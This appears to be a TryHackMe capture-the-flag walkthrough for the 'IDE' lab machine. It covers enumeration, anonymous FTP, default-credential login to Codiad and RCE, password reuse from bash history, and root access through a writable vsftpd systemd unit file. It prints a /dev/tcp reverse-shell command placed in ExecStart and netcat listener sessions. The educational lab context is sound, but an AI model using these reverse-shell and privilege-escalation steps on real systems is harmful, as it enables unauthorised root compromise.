# Try Hack Me - IDE

**Categories:** Enumeration, public exploit, privilege escalation, ftp  
**Difficulty:** Easy  

Commands used in this guide use the exported variable $IP (`export IP=10.10.5.51`) in place of the target machine's IP address.

## 1: Enumeration - nmap

Having launched the machine, we perform a full TCP port scan with nmap (`sudo nmap $IP -p-`) followed by a version enumeration scan on the 4 discovered ports (21, 22, 80 and 62337) :

```console
┌──(kali㉿kali)-[~]
└─$ sudo nmap $IP -p21,22,80,62337 -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-16 12:31 EDT
Nmap scan report for 10.10.5.51
Host is up (0.100s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 
```

Google / searchsploit show no relevant vulnerabilities for the discovered versions. Navigating to the application on 80 shows an apache2 default page, and navigating to the application on 62337 shows a login page for [Codiad, an in-browser cloud IDE that is no longer actively supported](http://codiad.com/). The page title shows that the application is running Codiad 2.8.4, and a searchsploit search for this version reveals a number of authenticated RCE vulnerabilities.

## 2. Infomation disclosure - ftp

The ftp instance on 21 allows anonymous login, and includes a "hidden" directory `...` with a file `-` :

```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18 06:10 .
drwxr-xr-x    3 0        114          4096 Jun 18 06:10 ..
drwxr-xr-x    2 0        0            4096 Jun 18 06:11 ...
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             151 Jun 18 06:11 -
drwxr-xr-x    2 0        0            4096 Jun 18 06:11 .
drwxr-xr-x    3 0        114          4096 Jun 18 06:10 ..
226 Directory send OK.
```

Downloading the file with `get -` reveals a note from drac to john regarding a password reset :

```console
┌──(kali㉿kali)-[~/Documents/tthm/ide]
└─$ cat ./-
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```

So we have 2 possible usernames - drac and john - and it is likely that john's "default" password is guessable or brute-forceable.  This is enough for the authenticated RCE vulnerability discovered during the enumeration phase

## 3. Codiad - RCE

A google search for Codiad default credentials doesn't give us much, but trying a set of possible default passwords (admin, root, toor, password, etc.) eventually gives us a session as the john user. Once authenticated, we can return to the RCE vulnerabilities discovered during the enumeration phase. 

I ultimately decided to write [my own exploit script](./codiad_exploit.py) targeting the project "Preview" functionality that allows for the execution of arbitrary PHP files by navigating to a .php project file at `/workspace/PROJECT-NAME/FILE-NAME`. To use the script, you should configure the USER, PASS, IP, PORT and HOST variables before starting a listener on your chosen port. After running the script (`python3 ./codiad_exploit.py`), a shell session is created as the www-data user : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/ide]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [ATTACK-IP] from (UNKNOWN) [10.10.5.51] 44640
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 4. Privesc, www-data -> drac - bash history

Running `cat /etc/passwd` shows that there is a single non-system user drac on the host. Navigating to drac's home directory, we see that their bash_history is readable and not empty :

```console
$ cd /home/drac
$ ls -la
total 52
drwxr-xr-x 6 drac drac 4096 Aug  4 07:06 .
drwxr-xr-x 3 root root 4096 Jun 17 14:01 ..
-rw------- 1 drac drac   49 Jun 18 06:02 .Xauthority
-rw-r--r-- 1 drac drac   36 Jul 11 12:11 .bash_history
...snip...
-r-------- 1 drac drac   33 Jun 18 06:32 user.txt
```

Catting the history reveals a password for a MySql service (this service is no longer active on the host) : 

```console
$ cat .bash_history
mysql -u drac -p PASSWORD
```

The same password can be used to switch to the drac user. The user flag is at `/home/drac/user.txt`. You can also start an SSH session as the drac user for a fully functional shell.


## 5. Privesc, drac -> root - writable systemd unit files

Running `sudo -l` as the drac user shows that they are able to restart the vsftpd service (the service running the FTP server we saw in step 2) as root :

```consoleb
drac@ide:~$ sudo -l
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

We can run `systemctl status vsftpd` for more information on the service, including the path of the unit file that defines how systemd should configure and manage the service : 

```console
drac@ide:~$ systemctl status vsftpd
● vsftpd.service - vsftpd FTP server
   Loaded: loaded (/lib/systemd/system/vsftpd.service; enabled; vendor preset: enabled)
   Active: active (running) since Mon 2021-10-18 17:12:52 UTC; 24min ago
  Process: 817 ExecStartPre=/bin/mkdir -p /var/run/vsftpd/empty (code=exited, status=0/SUCCESS)
 Main PID: 824 (vsftpd)
    Tasks: 1 (limit: 1103)
   CGroup: /system.slice/vsftpd.service
           └─824 /usr/sbin/vsftpd /etc/vsftpd.conf
```

This `/lib/systemd/system` directory is the standard location for unit files installed by applications (but in a CTF, it always helps to check!). Checking the permissions on the `vsftpd.service` unit file shows that it is writeable by users belonging to the "drac" group :

```console
drac@ide:~$ ls -la /lib/systemd/system/vsftpd.service 
-rw-rw-r-- 1 root drac 248 Aug  4 07:24 /lib/systemd/system/vsftpd.service
```

Understanding why this results in a vulnerability requires understanding the [basics of systemd unit files](https://www.digitalocean.com/community/tutorials/understanding-systemd-units-and-unit-files). A unit file configures the associated service through a series of KEY=VALUE lines, defining the scripts, binaries and configuration steps to be run when the service is stopped, started, restarted, etc. Catting the discovered `vsftpd.service` file, we see how it defines the actions to be taken on startup wth the "ExecStart" key :

```console
drac@ide:~$ cat /lib/systemd/system/vsftpd.service
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
...snip...
```

But as we've already seen this file is writable by members of the "drac" group, meaning we can change the value of the ExecStart key to execute an arbitrary script for privesc - chmoding `/etc/shadow`, copying a bash SUID to `/tmp`, etc. In this case, we'll go for a reverse shell, changing the ExecStart key as follows :

```console
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACK-IP/12321 0>&1'
```

We then start a listener on the attack machine and run `sudo /usr/sbin/service vsftpd restart` (you'll be asked to run `systemctl daemon-reload` to load the modified unit file - do this, then repeat the previous `sudo /usr/...` command) - this results in systemd accessing our modified `vsftpd.service` unit file and running the new ExecStart command as root, resulting in a reverse root shell on our attack machine :

```console
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 12321
listening on [any] 12321 ...
connect to [ATTACK-IP] from (UNKNOWN) [10.10.5.51] 54972
bash: cannot set terminal process group (2424): Inappropriate ioctl for device
bash: no job control in this shell
root@ide:/# id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag is at `/root/root.txt`.
